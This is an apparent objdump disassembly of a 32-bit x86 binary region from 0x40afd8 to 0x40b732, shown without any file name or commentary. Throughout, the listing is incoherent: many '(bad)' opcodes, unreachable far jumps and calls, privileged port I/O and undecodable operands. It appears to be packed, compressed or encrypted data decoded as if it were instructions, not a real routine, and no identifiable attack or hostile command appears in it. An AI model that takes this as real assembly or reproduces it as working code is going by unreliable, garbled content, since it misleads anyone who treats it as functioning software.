  40afd8:	mov    dl,BYTE PTR [ebx-0x16546ec7]
  40afde:	(bad)  
  40afdf:	dec    ebp
  40afe0:	xor    DWORD PTR [ebx],ebx
  40afe2:	dec    esp
  40afe3:	add    BYTE PTR [eax],dh
  40afe5:	or     BYTE PTR [edx+0x1f9a6f1],0x45
  40afec:	lds    edi,FWORD PTR [ebx]
  40afee:	pop    edx
  40afef:	cs repz pop esi
  40aff2:	cdq    
  40aff3:	sbb    BYTE PTR [ebp+0x2a],0x81
  40aff7:	dec    eax
  40aff8:	mov    ds:0xe8c58b54,eax
  40affd:	mul    BYTE PTR [edx+0x43c0717]
  40b003:	jnp    0x40aff4
  40b005:	inc    esp
  40b006:	leave  
  40b007:	dec    ebp
  40b008:	loopne 0x40b04f
  40b00a:	or     ecx,ecx
  40b00c:	and    bl,BYTE PTR [ecx]
  40b00e:	or     ch,BYTE PTR ds:0xccd57eb4
  40b014:	adc    eax,0x71cf91f9
  40b019:	inc    ebx
  40b01a:	inc    esp
  40b01b:	dec    ecx
  40b01c:	jl     0x40b002
  40b01e:	fmul   QWORD PTR [ecx-0x14cb922f]
  40b024:	jns    0x40b05d
  40b026:	ret    
  40b027:	test   al,0xee
  40b029:	sub    DWORD PTR [esi+edi*1-0x14],ebx
  40b02d:	pop    ebp
  40b02e:	pop    ecx
  40b02f:	pop    edi
  40b030:	mov    ebx,0x2ae5341c
  40b035:	retf   0x7089
  40b038:	mov    eax,0xedfd9244
  40b03d:	ffreep st(2)
  40b03f:	push   es
  40b040:	rcr    DWORD PTR [ebx+0x3fcd0ccc],cl
  40b046:	sub    cl,BYTE PTR ds:0xfdc471bd
  40b04c:	inc    edx
  40b04d:	fwait
  40b04e:	inc    ebx
  40b04f:	sub    bh,bh
  40b051:	jg     0x40b03c
  40b053:	sbb    DWORD PTR [edi-0x6f],edi
  40b056:	mov    ebp,0xa90e1703
  40b05b:	pop    ebx
  40b05c:	xchg   BYTE PTR [ebp+0xc],ch
  40b05f:	push   ebp
  40b060:	mov    ss,WORD PTR [ebp+0x6d5b6b38]
  40b066:	pop    esp
  40b067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b068:	fstp   st(7)
  40b06a:	stos   DWORD PTR es:[edi],eax
  40b06b:	stc    
  40b06c:	mov    esi,0xe21ae9b7
  40b071:	mov    dh,0xa8
  40b073:	les    ecx,FWORD PTR [esi-0x10]
  40b076:	jg     0x40b02c
  40b078:	dec    esp
  40b079:	dec    ebx
  40b07a:	mov    esp,0xaa5d2415
  40b07f:	jb     0x40b044
  40b081:	push   es
  40b082:	jmp    0x40b02c
  40b084:	push   ebx
  40b085:	push   ebp
  40b086:	loope  0x40b03f
  40b088:	ja     0x40b0fd
  40b08a:	cmp    edi,ecx
  40b08c:	daa    
  40b08d:	das    
  40b08e:	scas   al,BYTE PTR es:[edi]
  40b08f:	data16 (bad) 
  40b091:	js     0x40b052
  40b093:	and    ebp,esi
  40b095:	dec    ebp
  40b096:	call   0x2e83:0x6c2711ff
  40b09d:	push   esi
  40b09e:	adc    cl,BYTE PTR [eax]
  40b0a0:	mov    BYTE PTR [esi+0x49b3ec24],al
  40b0a6:	retf   
  40b0a7:	daa    
  40b0a8:	lahf   
  40b0a9:	fadd   st,st(1)
  40b0ab:	and    DWORD PTR [esi+ecx*4-0xc],ebp
  40b0af:	jnp    0x40b052
  40b0b1:	push   ss
  40b0b2:	retf   0x4596
  40b0b5:	cmp    dh,0x3c
  40b0b8:	mov    esi,0x93871f18
  40b0bd:	rcl    DWORD PTR [eax+0x5f356f31],cl
  40b0c3:	call   0xabff5871
  40b0c8:	test   al,0xa2
  40b0ca:	inc    esi
  40b0cb:	imul   ebp,DWORD PTR [ebx+edx*8],0x302001d3
  40b0d2:	push   es
  40b0d3:	sub    DWORD PTR [edx],0x4e9f135d
  40b0d9:	pop    ss
  40b0da:	repz or edx,ebx
  40b0dd:	sti    
  40b0de:	adc    al,0x56
  40b0e0:	shr    esp,cl
  40b0e2:	cwde   
  40b0e3:	mov    dl,0xf8
  40b0e5:	xadd   ch,ch
  40b0e8:	arpl   WORD PTR [ebx],bp
  40b0ea:	dec    ebx
  40b0eb:	test   al,0x8b
  40b0ed:	mov    WORD PTR [edx+eiz*4+0x3c],cs
  40b0f1:	pop    edx
  40b0f2:	mov    ecx,gs
  40b0f4:	push   ebx
  40b0f5:	inc    edx
  40b0f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f7:	xchg   esi,eax
  40b0f8:	(bad)  
  40b0f9:	lock pop edx
  40b0fb:	and    eax,0xc623a253
  40b100:	in     eax,0xb0
  40b102:	(bad)  
  40b103:	psraw  mm4,QWORD PTR [edx]
  40b106:	in     eax,0xb3
  40b108:	sti    
  40b109:	xor    DWORD PTR [eax],edi
  40b10b:	sbb    al,0x6
  40b10d:	shl    BYTE PTR [eax-0x67bc4493],1
  40b113:	mov    al,dl
  40b115:	in     al,0x96
  40b117:	push   es
  40b118:	dec    esp
  40b119:	xchg   ecx,eax
  40b11a:	test   BYTE PTR [eax+0x2ef4f444],dh
  40b120:	sbb    bl,BYTE PTR [ebx]
  40b122:	out    0xc9,eax
  40b124:	idiv   DWORD PTR [edi]
  40b126:	pop    edx
  40b127:	dec    esp
  40b128:	sub    edx,ecx
  40b12a:	sub    ch,BYTE PTR [edx+0xc09137]
  40b130:	mov    eax,0x3fd62364
  40b135:	call   0x793daa0d
  40b13a:	mov    edx,DWORD PTR [esi+0x45b5bec9]
  40b140:	std    
  40b141:	stos   BYTE PTR es:[edi],al
  40b142:	dec    ebp
  40b143:	pop    ds
  40b144:	shl    DWORD PTR [esi+ecx*4+0x27f26401],0xb3
  40b14c:	jno    0x40b139
  40b14e:	xor    al,0xa8
  40b150:	and    cl,dl
  40b152:	std    
  40b153:	(bad)  
  40b154:	mov    esi,0x5019c305
  40b159:	pop    edx
  40b15a:	mov    ecx,0xe8518e5a
  40b15f:	ja     0x40b106
  40b161:	mov    edi,0xf6a289f0
  40b166:	dec    dl
  40b168:	xchg   DWORD PTR [edx],edx
  40b16a:	inc    edx
  40b16b:	in     eax,dx
  40b16c:	(bad)  
  40b16d:	cwde   
  40b16e:	and    eax,0xadd7dc2c
  40b173:	mov    ebp,0x71ee3a3c
  40b178:	add    dl,BYTE PTR [ebp-0xd]
  40b17b:	nop
  40b17c:	mov    BYTE PTR ds:0x9a711a3f,dh
  40b182:	mov    dl,bh
  40b184:	jns    0x40b127
  40b186:	outs   dx,DWORD PTR ds:[esi]
  40b187:	xor    BYTE PTR [ebp+0x282f8812],0xd1
  40b18e:	sti    
  40b18f:	mov    ebp,DWORD PTR [edi]
  40b191:	fcomp  QWORD PTR ds:0x377574d7
  40b197:	mov    ebp,0x1687b673
  40b19c:	(bad)  
  40b19f:	out    dx,eax
  40b1a0:	sub    BYTE PTR [esi+edx*8],dh
  40b1a3:	test   DWORD PTR [eax+0x3680dd5f],ebp
  40b1a9:	nop
  40b1aa:	jns    0x40b14b
  40b1ac:	test   eax,0x6ac3c272
  40b1b1:	dec    edx
  40b1b2:	std    
  40b1b3:	idiv   BYTE PTR [ecx+0x7b8a42f8]
  40b1b9:	scas   eax,DWORD PTR es:[edi]
  40b1ba:	popa   
  40b1bb:	dec    eax
  40b1bc:	mov    bh,0xff
  40b1be:	popf   
  40b1bf:	dec    edx
  40b1c0:	es addr16 (bad) 
  40b1c3:	sub    ebx,0xab68c45
  40b1c9:	mov    eax,0x4bddf7a2
  40b1ce:	ret    
  40b1cf:	push   ss
  40b1d0:	xchg   esi,eax
  40b1d1:	mov    ds:0xd418ba61,eax
  40b1d6:	jbe    0x40b17d
  40b1d8:	in     al,0x50
  40b1da:	jecxz  0x40b1ee
  40b1dc:	int3   
  40b1dd:	xchg   DWORD PTR [esi+ebp*4],ebx
  40b1e0:	inc    esi
  40b1e1:	cwde   
  40b1e2:	int    0xb3
  40b1e4:	jl     0x40b1f4
  40b1e6:	add    ebp,edi
  40b1e8:	or     al,BYTE PTR [edx]
  40b1ea:	push   edx
  40b1eb:	xor    al,0xed
  40b1ed:	shl    DWORD PTR [esi+0x44c1b447],1
  40b1f3:	xchg   esp,eax
  40b1f4:	mov    esp,0x16659e23
  40b1f9:	out    dx,al
  40b1fa:	scas   al,BYTE PTR es:[edi]
  40b1fb:	clc    
  40b1fc:	aam    0x79
  40b1fe:	jle    0x40b24f
  40b200:	or     eax,0xa0a87ca2
  40b205:	adc    dh,ch
  40b207:	pop    edx
  40b208:	inc    eax
  40b209:	lock jo 0x40b1ed
  40b20c:	mov    esp,0xdfb2cb97
  40b211:	add    edx,DWORD PTR [ecx+0x45]
  40b214:	push   ebx
  40b215:	xor    BYTE PTR [eax+0x27288944],0xac
  40b21c:	ja     0x40b29a
  40b21e:	sbb    edx,edx
  40b220:	jp     0x40b1e6
  40b222:	mul    DWORD PTR [ecx]
  40b224:	jbe    0x40b238
  40b226:	repz test DWORD PTR [eax],0xed11fb86
  40b22d:	out    dx,eax
  40b22e:	sbb    edi,DWORD PTR [edx]
  40b230:	xchg   DWORD PTR [eax-0x74e415ff],ebp
  40b236:	sbb    DWORD PTR [esi+0x56],edx
  40b239:	push   cs
  40b23a:	adc    DWORD PTR [ecx-0x42a220b0],edx
  40b240:	jne    0x40b2a0
  40b242:	cmp    DWORD PTR [ebp-0x7b],0x2
  40b246:	or     esi,DWORD PTR [ecx-0x2d9fbca7]
  40b24c:	stos   DWORD PTR es:[edi],eax
  40b24d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b24e:	cmp    BYTE PTR [eax+0x7fb63175],bl
  40b254:	xchg   BYTE PTR [eax+0x65],bl
  40b257:	push   edi
  40b258:	mov    esi,0xfbd51d46
  40b25d:	mov    dl,0xaf
  40b25f:	fcomp  QWORD PTR [edi-0x1e798bd8]
  40b265:	xchg   edx,eax
  40b266:	sbb    al,0x92
  40b268:	lock (bad) 
  40b26a:	pop    edi
  40b26b:	retf   
  40b26c:	and    eax,0x801b0329
  40b271:	arpl   WORD PTR [ebx+ebx*4],di
  40b274:	jp     0x40b1ff
  40b276:	loop   0x40b277
  40b278:	sti    
  40b279:	in     al,0x7d
  40b27b:	mov    dl,BYTE PTR [eax]
  40b27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b27e:	hlt    
  40b27f:	shl    BYTE PTR [edx-0x2e],0x6e
  40b283:	icebp  
  40b284:	xor    ecx,esp
  40b286:	in     al,0x7
  40b288:	push   esi
  40b289:	(bad)  
  40b28b:	arpl   WORD PTR [ecx],ax
  40b28d:	enter  0xc6ed,0xc
  40b291:	or     BYTE PTR [si],cl
  40b294:	mov    DWORD PTR [eax],0x6f773656
  40b29a:	in     al,0x9c
  40b29c:	add    ebx,DWORD PTR [edi]
  40b29e:	dec    edi
  40b29f:	je     0x40b227
  40b2a1:	stos   BYTE PTR es:[edi],al
  40b2a2:	fisubr WORD PTR [edi+esi*8+0x4f]
  40b2a6:	dec    edi
  40b2a7:	cmp    al,0x45
  40b2a9:	push   cs
  40b2aa:	je     0x40b27a
  40b2ac:	push   ecx
  40b2ad:	pop    ecx
  40b2ae:	jge    0x40b289
  40b2b0:	and    eax,0x5af97573
  40b2b5:	shl    edi,0xc9
  40b2b8:	out    dx,al
  40b2b9:	jno    0x40b2d1
  40b2bb:	enter  0x23f6,0xd3
  40b2bf:	or     ah,BYTE PTR [esp+edi*4]
  40b2c2:	xchg   bh,bl
  40b2c4:	fist   DWORD PTR [edx]
  40b2c6:	jne    0x40b321
  40b2c8:	cs cli 
  40b2ca:	inc    ecx
  40b2cb:	xchg   esi,eax
  40b2cc:	aaa    
  40b2cd:	fbld   TBYTE PTR [edi+0x1fe0b827]
  40b2d3:	ins    BYTE PTR es:[edi],dx
  40b2d4:	js     0x40b2f0
  40b2d6:	popa   
  40b2d7:	imul   esp,DWORD PTR [ebp+0x5715be6d],0x65f8be16
  40b2e1:	lds    edx,FWORD PTR [ebx+0x1c1f203b]
  40b2e7:	(bad)  
  40b2e8:	jle    0x40b2b0
  40b2ea:	jb     0x40b341
  40b2ec:	xor    edi,ebp
  40b2ee:	add    BYTE PTR [ecx+0x1b],0x57
  40b2f2:	(bad)  
  40b2f3:	dec    ecx
  40b2f4:	cld    
  40b2f5:	imul   DWORD PTR [edi-0x35d4b858]
  40b2fb:	iret   
  40b2fc:	jmp    0xbadbc13c
  40b301:	popf   
  40b302:	add    eax,0xfd2a5079
  40b307:	sti    
  40b308:	lods   al,BYTE PTR ds:[esi]
  40b309:	mov    edi,0xa965d1d1
  40b30e:	mov    ecx,0x8ee3389c
  40b313:	mov    ah,0x92
  40b315:	sub    DWORD PTR [eax],edx
  40b317:	xchg   ebp,eax
  40b318:	imul   eax,DWORD PTR [ebp+0x69],0xab9ba9cc
  40b31f:	(bad)  
  40b320:	push   esp
  40b321:	(bad)  
  40b322:	jmp    0x6c27:0xfacb7881
  40b329:	mov    edi,DWORD PTR [ebx+0x1f]
  40b32c:	test   BYTE PTR [ebx+ebx*8+0x2f713776],dl
  40b333:	in     al,dx
  40b334:	int3   
  40b335:	sub    ecx,DWORD PTR [esi+0x78db6a19]
  40b33b:	adc    ebx,esp
  40b33d:	aaa    
  40b33e:	mov    edx,0x5f4ff436
  40b343:	xchg   DWORD PTR [ebp+0x1a0b28af],ecx
  40b349:	jmp    0x40b324
  40b34b:	mov    ch,0x24
  40b34d:	les    eax,FWORD PTR [ebx+0x58e3a727]
  40b353:	dec    ebp
  40b354:	shl    DWORD PTR [eax-0x1e],1
  40b357:	imul   edi,DWORD PTR [eax*4-0x40089c86],0x44
  40b35f:	jne    0x40b32d
  40b361:	cwde   
  40b362:	and    BYTE PTR [esi+0x3527ec00],0xb3
  40b369:	xchg   edi,eax
  40b36a:	adc    ecx,ebx
  40b36c:	fcmovnb st,st(0)
  40b36e:	sub    BYTE PTR [ebp+0x33],al
  40b371:	lds    ecx,FWORD PTR [eax-0x43864eb3]
  40b377:	lds    esp,FWORD PTR [ecx-0x22]
  40b37a:	mov    bl,0x8c
  40b37c:	bound  ecx,QWORD PTR [eax]
  40b37e:	ins    DWORD PTR es:[edi],dx
  40b37f:	xor    DWORD PTR [esi],ebp
  40b381:	fadd   QWORD PTR [edi]
  40b383:	add    DWORD PTR [edx+0x9],edx
  40b386:	sbb    edx,DWORD PTR [esi]
  40b388:	push   ebx
  40b389:	push   edi
  40b38a:	iret   
  40b38b:	adc    DWORD PTR [edx-0x665cf692],0x767360ba
  40b395:	repnz and al,0xfe
  40b398:	pop    ebx
  40b399:	stos   BYTE PTR es:[edi],al
  40b39a:	ficom  DWORD PTR [edx-0x4]
  40b39d:	jecxz  0x40b37b
  40b39f:	sbb    cl,dl
  40b3a1:	sbb    DWORD PTR [eax+0x26],esi
  40b3a4:	in     eax,0xde
  40b3a6:	xchg   esp,eax
  40b3a7:	jno    0x40b34e
  40b3a9:	lds    ebp,FWORD PTR [esi]
  40b3ab:	adc    DWORD PTR [esi+0x1cbc7db6],ebp
  40b3b1:	int    0x1b
  40b3b3:	or     ebx,DWORD PTR [ebp+0x53]
  40b3b6:	push   ebp
  40b3b7:	div    DWORD PTR [edi+0xa]
  40b3ba:	mov    ecx,0xdccf49f
  40b3bf:	in     al,0xe7
  40b3c1:	xchg   esp,eax
  40b3c2:	daa    
  40b3c3:	outs   dx,BYTE PTR ds:[esi]
  40b3c4:	mov    eax,DWORD PTR [eax+0x52]
  40b3c7:	dec    edx
  40b3c8:	xchg   edi,eax
  40b3c9:	sub    eax,DWORD PTR [esi-0x55406a42]
  40b3cf:	scas   eax,DWORD PTR es:[edi]
  40b3d0:	stos   BYTE PTR es:[edi],al
  40b3d1:	inc    esi
  40b3d2:	push   esp
  40b3d3:	int    0x19
  40b3d5:	xchg   DWORD PTR [ebp+0x635cee8a],ebp
  40b3db:	rcl    BYTE PTR [edx+0x16],1
  40b3de:	imul   BYTE PTR [edx+0x6edcf201]
  40b3e4:	daa    
  40b3e5:	test   eax,0xdaffe748
  40b3ea:	test   BYTE PTR [edi],dl
  40b3ec:	jecxz  0x40b398
  40b3ee:	inc    ebx
  40b3ef:	loop   0x40b3af
  40b3f1:	lds    esp,FWORD PTR [ebx+0x45]
  40b3f4:	and    BYTE PTR [ebp+0x601c79e4],ah
  40b3fa:	or     DWORD PTR [edx+0x712eba1e],esp
  40b400:	jmp    0xc61e:0x275cf127
  40b407:	scas   al,BYTE PTR es:[edi]
  40b408:	stc    
  40b409:	lds    ebx,FWORD PTR [ecx]
  40b40b:	out    dx,al
  40b40c:	inc    eax
  40b40d:	push   0xab5db49a
  40b412:	into   
  40b413:	or     BYTE PTR [eax-0x6e],bl
  40b416:	and    DWORD PTR [edx-0x643cc5d1],ecx
  40b41c:	outs   dx,DWORD PTR ds:[esi]
  40b41d:	in     eax,0xf6
  40b41f:	(bad)  
  40b420:	and    ah,BYTE PTR [ebx+0x2d]
  40b423:	in     eax,0x3f
  40b425:	shl    BYTE PTR [eax+0x2],cl
  40b428:	ret    
  40b429:	add    eax,DWORD PTR [ebx]
  40b42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b42c:	hlt    
  40b42d:	sbb    al,0xd7
  40b42f:	sbb    BYTE PTR [ebx+edx*8+0x57],cl
  40b433:	jp     0x40b3be
  40b435:	xchg   ecx,eax
  40b436:	pop    esp
  40b437:	fdiv   QWORD PTR [edx+0x12adbcf7]
  40b43d:	add    al,0xb7
  40b43f:	test   DWORD PTR [eax],edi
  40b441:	jp     0x40b40d
  40b443:	arpl   bp,si
  40b445:	in     eax,dx
  40b446:	adc    BYTE PTR [edi+0x2466f735],al
  40b44c:	jo     0x40b49f
  40b44e:	push   eax
  40b44f:	xchg   edx,eax
  40b450:	sub    al,0x25
  40b452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b453:	xor    BYTE PTR [eax+0x5dcf610a],dh
  40b459:	pusha  
  40b45a:	outs   dx,BYTE PTR ds:[esi]
  40b45b:	sbb    al,0x1
  40b45d:	imul   eax,edx,0x6fdf0dc7
  40b463:	jge    0x40b44e
  40b465:	push   edx
  40b466:	mov    bh,0x76
  40b468:	pop    ecx
  40b469:	and    eax,0xdc66bf61
  40b46e:	cwde   
  40b46f:	inc    ecx
  40b470:	test   BYTE PTR [ecx-0x45],dh
  40b473:	lahf   
  40b474:	dec    ecx
  40b475:	aaa    
  40b476:	pop    ss
  40b477:	int    0x52
  40b479:	test   DWORD PTR [ebx-0x16],edi
  40b47c:	in     eax,0xab
  40b47e:	sar    DWORD PTR [eax+ebp*2-0x1920b4e],0x9
  40b486:	ins    DWORD PTR es:[edi],dx
  40b487:	cmp    al,ah
  40b489:	sub    eax,0x3c5b2a1f
  40b48e:	scas   al,BYTE PTR es:[edi]
  40b48f:	push   esi
  40b490:	sbb    eax,0xe4a6e0b5
  40b495:	adc    eax,0x704fa434
  40b49a:	dec    esp
  40b49b:	(bad)  
  40b49c:	dec    ebx
  40b49d:	or     esi,ebx
  40b49f:	add    eax,0x60ca5c0b
  40b4a4:	(bad)  
  40b4a5:	add    BYTE PTR [esi+0x4d5f2c28],al
  40b4ab:	mov    bl,0xdc
  40b4ad:	gs gs cdq 
  40b4b0:	(bad)  
  40b4b1:	mov    BYTE PTR [edi-0x29],cl
  40b4b4:	test   eax,0xbca85010
  40b4b9:	cmp    bh,BYTE PTR [edx-0x2d]
  40b4bc:	adc    eax,0x359cc122
  40b4c1:	ret    
  40b4c2:	xor    ebp,DWORD PTR [edx]
  40b4c4:	mov    edi,0xba7d6fb
  40b4c9:	sar    BYTE PTR [ebp+0x6e],cl
  40b4cc:	dec    eax
  40b4cd:	inc    eax
  40b4ce:	xchg   ebx,eax
  40b4cf:	int3   
  40b4d0:	sub    ecx,DWORD PTR [ecx-0x7a]
  40b4d3:	pop    esp
  40b4d4:	stos   BYTE PTR es:[edi],al
  40b4d5:	xchg   ebp,eax
  40b4d6:	and    eax,0x3a3b9079
  40b4db:	lods   eax,DWORD PTR ds:[esi]
  40b4dc:	xchg   esi,eax
  40b4dd:	popa   
  40b4de:	nop
  40b4df:	addr16 mov cl,0x77
  40b4e2:	je     0x40b4d7
  40b4e4:	or     al,0x15
  40b4e6:	dec    esi
  40b4e7:	rcl    ch,cl
  40b4e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ea:	mov    ebx,0x1e527764
  40b4ef:	pushf  
  40b4f0:	mov    esp,0x23ef3d1d
  40b4f5:	jl     0x40b505
  40b4f7:	jmp    0x26cc6439
  40b4fc:	jb     0x40b490
  40b4fe:	rol    dh,cl
  40b500:	je     0x40b54b
  40b502:	xor    al,0x6f
  40b504:	(bad)  
  40b505:	push   esp
  40b506:	sbb    eax,0xb6ecfe49
  40b50b:	inc    ebp
  40b50c:	es (bad) 
  40b50e:	lods   al,BYTE PTR ds:[esi]
  40b50f:	xchg   edx,eax
  40b510:	das    
  40b511:	in     eax,dx
  40b512:	push   0xffffffd4
  40b514:	call   0x3e38:0x9839b97e
  40b51b:	nop
  40b51c:	je     0x40b4c6
  40b51e:	fdivr  QWORD PTR [ebx+edx*4-0x7ef69d3d]
  40b525:	stos   DWORD PTR es:[edi],eax
  40b526:	imul   ebx,DWORD PTR [esi+0x60f747b2],0xffffff8c
  40b52d:	mov    ds:0xee44c39b,eax
  40b532:	mov    ah,0x80
  40b534:	(bad)  
  40b535:	fnstcw WORD PTR [ebx-0x21]
  40b538:	cmc    
  40b539:	dec    edx
  40b53a:	jge    0x40b5af
  40b53c:	mov    ?,esp
  40b53e:	mov    dh,0x78
  40b540:	sbb    al,0x5b
  40b542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b543:	inc    ebp
  40b544:	jg     0x40b545
  40b546:	rcr    DWORD PTR [edi+0x48],1
  40b549:	outs   dx,DWORD PTR ds:[esi]
  40b54a:	into   
  40b54b:	les    ecx,FWORD PTR [edx]
  40b54d:	rcl    BYTE PTR [eax+0x2e],0x39
  40b551:	aaa    
  40b552:	js     0x40b56c
  40b554:	jge    0x40b537
  40b556:	push   ecx
  40b557:	push   edx
  40b558:	and    BYTE PTR ds:0xa759483c,0x51
  40b55f:	das    
  40b560:	pop    eax
  40b561:	push   0x5c6d9df5
  40b566:	out    0x8b,eax
  40b568:	inc    ecx
  40b569:	stos   BYTE PTR es:[edi],al
  40b56a:	xchg   edi,eax
  40b56b:	jg     0x40b55e
  40b56d:	adc    BYTE PTR [esi],0xc0
  40b570:	shl    esi,cl
  40b572:	jns    0x40b51a
  40b574:	mov    eax,0x4ec63a72
  40b579:	push   eax
  40b57a:	xchg   ebx,eax
  40b57b:	icebp  
  40b57c:	test   BYTE PTR [esi],bl
  40b57e:	xchg   BYTE PTR [edx-0x3e0a4f2d],bh
  40b584:	jns    0x40b597
  40b586:	retf   
  40b587:	sub    bl,BYTE PTR [ebx]
  40b589:	imul   edi,edi,0xffffffb1
  40b58c:	shr    BYTE PTR [esi+0x54],1
  40b58f:	rol    BYTE PTR [edx+0x72de0e00],1
  40b595:	pop    edi
  40b596:	mov    gs,WORD PTR [eax+0x5d9eb549]
  40b59c:	fdivr  DWORD PTR [eax+0x1c]
  40b59f:	std    
  40b5a0:	sub    al,0xff
  40b5a2:	adc    ah,dh
  40b5a4:	loope  0x40b547
  40b5a6:	or     al,0x7e
  40b5a8:	jg     0x40b5c7
  40b5aa:	push   ebx
  40b5ab:	mov    gs,WORD PTR [ecx-0x108ae01e]
  40b5b1:	jge    0x40b556
  40b5b3:	push   es
  40b5b4:	cmc    
  40b5b5:	vaddsubpd ymm6,ymm2,ymm6
  40b5b9:	ds mov bl,cl
  40b5bc:	xor    al,0x8d
  40b5be:	and    ebp,DWORD PTR [edi+eiz*4+0x62dd4164]
  40b5c5:	ja     0x40b5fb
  40b5c7:	push   edi
  40b5c8:	mov    dh,0x8a
  40b5ca:	aad    0xdd
  40b5cc:	mov    esi,0x7af143fd
  40b5d1:	mov    edi,0x5d084b82
  40b5d6:	into   
  40b5d7:	sbb    al,dh
  40b5d9:	cmp    ah,BYTE PTR [ecx]
  40b5db:	mov    ds:0xcfa5e86f,eax
  40b5e0:	xor    bh,BYTE PTR [edx-0xd2c349b]
  40b5e6:	inc    esp
  40b5e7:	stc    
  40b5e8:	and    BYTE PTR [edi],bl
  40b5ea:	mov    ds:0x8d3a7887,eax
  40b5ef:	sub    DWORD PTR [ecx],0x83b4258
  40b5f5:	ds dec eax
  40b5f7:	fst    DWORD PTR [edx]
  40b5f9:	aaa    
  40b5fa:	adc    eax,esp
  40b5fc:	repnz arpl bx,si
  40b5ff:	out    0xf9,al
  40b601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b602:	sub    BYTE PTR [ecx],ah
  40b604:	mov    al,0xcd
  40b606:	aad    0x7e
  40b608:	mov    al,0x31
  40b60a:	out    0xcc,eax
  40b60c:	inc    esp
  40b60d:	loopne 0x40b66b
  40b60f:	push   esi
  40b610:	add    DWORD PTR [esi-0x3598b330],eax
  40b616:	add    BYTE PTR [eax+0x34],ch
  40b619:	inc    edx
  40b61a:	jnp    0x40b59f
  40b61c:	pushf  
  40b61d:	inc    ebx
  40b61e:	and    eax,0x1b1a7a19
  40b623:	loopne 0x40b666
  40b625:	int    0x5f
  40b627:	and    DWORD PTR [ebp+0x5a],esp
  40b62a:	sti    
  40b62b:	inc    edi
  40b62c:	imul   BYTE PTR [eax]
  40b62e:	jo     0x40b5fc
  40b630:	shr    ebx,0xfd
  40b633:	and    edi,esp
  40b635:	inc    esp
  40b636:	add    cl,BYTE PTR [esi]
  40b638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b639:	out    dx,al
  40b63a:	sub    esi,ebp
  40b63c:	cmp    esp,DWORD PTR [edi+0x6474f094]
  40b642:	in     eax,dx
  40b643:	(bad)  
  40b644:	xchg   edx,eax
  40b645:	fisub  DWORD PTR [eax-0x32bf860c]
  40b64b:	ss popa 
  40b64d:	mov    ah,0x3
  40b64f:	lahf   
  40b650:	sbb    ch,BYTE PTR [esi-0x4b5410e6]
  40b656:	(bad)  
  40b657:	cwde   
  40b658:	mov    eax,ds:0x28a73c9e
  40b65d:	cmp    BYTE PTR [ecx-0x1e9387e5],bl
  40b663:	xchg   ebp,eax
  40b664:	xor    dl,BYTE PTR [edx-0x57573d40]
  40b66a:	xor    eax,0xe4258409
  40b66f:	mov    esp,0xe60bfd7a
  40b674:	jae    0x40b63c
  40b676:	dec    ecx
  40b677:	sub    ecx,DWORD PTR [edx+0xe]
  40b67a:	test   al,0xaa
  40b67c:	stc    
  40b67d:	or     al,0xd3
  40b67f:	pop    ds
  40b680:	and    al,BYTE PTR [eax+ebx*8]
  40b683:	fcom   st(3)
  40b685:	ss mov ch,ah
  40b688:	push   ecx
  40b689:	jecxz  0x40b60d
  40b68b:	cwde   
  40b68c:	or     esp,edx
  40b68e:	stos   BYTE PTR es:[edi],al
  40b68f:	inc    esp
  40b690:	sbb    bl,BYTE PTR [eax+0x68]
  40b693:	in     al,0x73
  40b695:	(bad)  
  40b696:	jns    0x40b6ef
  40b698:	mov    ebp,0xf2a5fd62
  40b69d:	push   ss
  40b69e:	scas   eax,DWORD PTR es:[edi]
  40b69f:	nop
  40b6a0:	add    ecx,DWORD PTR [edx-0x1028bfc3]
  40b6a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a7:	cmp    al,0x22
  40b6a9:	call   0xa05e:0x55fa3ec
  40b6b0:	jnp    0x40b635
  40b6b2:	out    0x38,al
  40b6b4:	jae    0x40b641
  40b6b6:	fld    TBYTE PTR [edi+0x71192e19]
  40b6bc:	outs   dx,DWORD PTR ds:[esi]
  40b6bd:	add    BYTE PTR [esi],dl
  40b6bf:	arpl   WORD PTR [ecx+0x62],si
  40b6c2:	mov    esp,0x3c87a7a6
  40b6c7:	icebp  
  40b6c8:	adc    ebp,ecx
  40b6ca:	xor    esp,DWORD PTR [edi+0x5b048f54]
  40b6d0:	xchg   edi,eax
  40b6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d2:	dec    esp
  40b6d3:	xchg   edx,eax
  40b6d4:	jl     0x40b6c5
  40b6d6:	sbb    DWORD PTR [ecx],edx
  40b6d8:	sbb    al,al
  40b6da:	and    BYTE PTR [edi+0x2a0055aa],al
  40b6e0:	mov    ?,WORD PTR [ecx]
  40b6e2:	cwde   
  40b6e3:	test   eax,0x33ed477a
  40b6e8:	inc    ebx
  40b6e9:	mov    BYTE PTR [ecx],ah
  40b6eb:	mov    eax,0xe0723f69
  40b6f0:	adc    eax,0x41c67b71
  40b6f5:	adc    al,0x4a
  40b6f7:	pop    esi
  40b6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f9:	inc    ecx
  40b6fa:	xchg   esi,eax
  40b6fb:	pop    edx
  40b6fc:	sub    ch,al
  40b6fe:	xchg   esp,eax
  40b6ff:	push   ss
  40b700:	mov    esi,0xa2c91c9f
  40b705:	jbe    0x40b6a3
  40b707:	aad    0xe5
  40b709:	stc    
  40b70a:	(bad)  
  40b70c:	nop
  40b70d:	push   0x2499cd07
  40b712:	cwde   
  40b713:	imul   edx,esi,0xcf8b32cc
  40b719:	jo     0x40b6f0
  40b71b:	push   edi
  40b71c:	jnp    0x40b6ce
  40b71e:	pusha  
  40b71f:	cmp    al,BYTE PTR [ebx+eax*2-0xb]
  40b723:	std    
  40b724:	out    dx,eax
  40b725:	mov    ah,0xff
  40b727:	pushf  
  40b728:	sub    ebx,eax
  40b72a:	repz hlt 
  40b72c:	aam    0x7
  40b72e:	push   ecx
  40b72f:	cmp    al,0x12
  40b731:	(bad)  
  40b732:	mov    BYTE PTR [edx],ah
